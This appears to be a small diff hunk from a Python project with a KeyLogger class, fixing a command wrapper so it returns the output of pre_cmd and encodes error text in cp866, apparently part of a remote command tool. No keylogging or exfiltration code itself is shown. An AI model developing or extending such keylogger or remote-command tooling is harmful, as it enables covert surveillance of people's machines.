@@ -228,7 +228,7 @@ class KeyLogger:
 
 def cmd(*args, **kwargs):
     try:
-        pre_cmd(*args, **kwargs)
+        return pre_cmd(*args, **kwargs)
     except Exception as e:
         return str(e).encode('cp866')
 
